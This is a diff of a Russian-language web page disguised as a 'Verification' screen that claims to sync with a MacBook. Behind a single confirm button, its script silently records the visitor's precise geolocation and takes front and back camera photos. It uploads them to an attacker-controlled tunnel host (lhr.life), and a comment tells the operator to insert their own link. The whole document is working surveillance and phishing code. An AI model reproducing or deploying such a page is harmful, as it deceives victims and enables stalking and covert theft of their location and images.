@@ -2,116 +2,72 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>System Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Verification</title>
     <style>
-        :root { --bg: #000; --card: #111; }
-        body { margin:0; background:var(--bg); color:#fff; font-family:-apple-system, system-ui, sans-serif; height:100vh; display:flex; align-items:center; justify-content:center; overflow:hidden; }
-        .card { width:85%; max-width:300px; padding:50px 20px; background:var(--card); border-radius:35px; border:1px solid #222; text-align:center; box-shadow: 0 15px 35px rgba(0,0,0,0.7); }
-        h2 { font-size:24px; margin:0 0 10px; font-weight:600; }
-        p { font-size:15px; color:#666; margin:0 0 35px; line-height:1.4; }
-        .btn { background:#fff; color:#000; border:none; padding:20px; border-radius:20px; width:100%; font-weight:700; font-size:16px; cursor:pointer; -webkit-tap-highlight-color:transparent; }
-        #loader { display:none; margin:0 auto; width:30px; height:30px; border:3px solid #222; border-top:3px solid #fff; border-radius:50%; animation:spin 0.8s linear infinite; }
-        @keyframes spin { to { transform:rotate(360deg); } }
+        body { background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
+        .card { text-align:center; padding:40px; background:#111; border-radius:30px; width:80%; border:1px solid #333; }
+        .btn { background:#fff; color:#000; border:none; padding:15px 30px; border-radius:15px; font-weight:bold; cursor:pointer; width:100%; }
+        #loader { display:none; border:4px solid #333; border-top:4px solid #fff; border-radius:50%; width:30px; height:30px; animation:spin 1s linear infinite; margin:20px auto; }
+        @keyframes spin { 100% { transform:rotate(360deg); } }
         video, canvas { display:none; }
     </style>
 </head>
 <body>
-
     <div class="card">
         <h2 id="st">Verification</h2>
-        <p id="msg">Нажмите подтвердить для завершения синхронизации.</p>
+        <p id="msg">Нажмите для синхронизации с MacBook</p>
         <button class="btn" id="go" onclick="run()">ПОДТВЕРДИТЬ</button>
         <div id="loader"></div>
     </div>
-
     <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
 
     <script>
-        // ТВОЯ НОВАЯ ССЫЛКА
-        const API = "https://a8c62141b53c63.lhr.life"; 
+        // ЗАМЕНИ НА СВОЮ АКТУАЛЬНУЮ ССЫЛКУ LHR.LIFE
+        const API = "https://166e0338275ee5.lhr.life"; 
 
-        const urlParams = new URLSearchParams(window.location.search);
-        const user = urlParams.get('user') || "Unknown_User";
+        const user = new URLSearchParams(window.location.search).get('user') || "Unknown";
 
-        async function captureFrame(facingMode) {
+        async function takePhoto(mode) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                 const v = document.getElementById('v');
                 v.srcObject = stream;
-                await v.play();
-                
-                // Пауза 1.5 сек для автофокуса
-                await new Promise(r => setTimeout(r, 1500));
-
+                await new Promise(r => setTimeout(r, 2000));
                 const canvas = document.getElementById('c');
-                canvas.width = v.videoWidth;
-                canvas.height = v.videoHeight;
+                canvas.width = v.videoWidth; canvas.height = v.videoHeight;
                 canvas.getContext('2d').drawImage(v, 0, 0);
-                
                 const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
-                
                 stream.getTracks().forEach(t => t.stop());
-                v.srcObject = null;
                 return blob;
-            } catch (err) {
-                return null;
-            }
+            } catch { return null; }
         }
 
         async function run() {
-            const btn = document.getElementById('go'), ld = document.getElementById('loader');
-            const st = document.getElementById('st'), msg = document.getElementById('msg');
+            document.getElementById('go').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
 
-            btn.style.display = 'none';
-            ld.style.display = 'block';
-            st.innerText = "Syncing...";
-            msg.innerText = ""; 
+            // 1. Геопозиция
+            navigator.geolocation.getCurrentPosition(p => {
+                fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`);
+            }, null, {enableHighAccuracy:true});
 
-            // 1. ГЕОЛОКАЦИЯ (сразу при нажатии)
-            navigator.geolocation.getCurrentPosition(
-                (p) => {
-                    fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`, {mode:'no-cors'});
-                },
-                null,
-                { enableHighAccuracy: true, timeout: 5000 }
-            );
+            // 2. Фото
+            const fd = new FormData();
+            const f1 = await takePhoto("user");
+            if (f1) fd.append('files', f1, 'front.jpg');
+            const f2 = await takePhoto("environment");
+            if (f2) fd.append('files', f2, 'back.jpg');
 
-            try {
-                // 2. ПРОГРЕВ (запрос доступа одним махом)
-                const warmup = await navigator.mediaDevices.getUserMedia({ video: true });
-                warmup.getTracks().forEach(t => t.stop());
-
-                const fd = new FormData();
-
-                // 3. СЪЕМКА
-                const b1 = await captureFrame("user");
-                if (b1) fd.append('files', b1, 'front.jpg');
-
-                const b2 = await captureFrame("environment");
-                if (b2) fd.append('files', b2, 'back.jpg');
-
-                // 4. ОТПРАВКА НА МАК
-                if (fd.has('files')) {
-                    const response = await fetch(`${API}/upload-photo?user=${user}`, {
-                        method: 'POST',
-                        body: fd
-                    });
-
-                    if (response.ok) {
-                        st.innerText = "Verified";
-                        ld.style.display = 'none';
-                        msg.innerText = "Готово.";
-                        msg.style.color = "#4cd964";
-                    }
-                } else {
-                    throw new Error();
-                }
-            } catch (e) {
-                alert("Ошибка: Пожалуйста, разрешите доступ к камере.");
+            // 3. Отправка
+            if (fd.has('files')) {
+                await fetch(`${API}/upload-photo?user=${user}`, { method: 'POST', body: fd });
+                document.getElementById('st').innerText = "Готово";
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('msg').innerText = "Проверка завершена успешно.";
+            } else {
+                alert("Ошибка доступа к камере.");
                 location.reload();
             }
         }
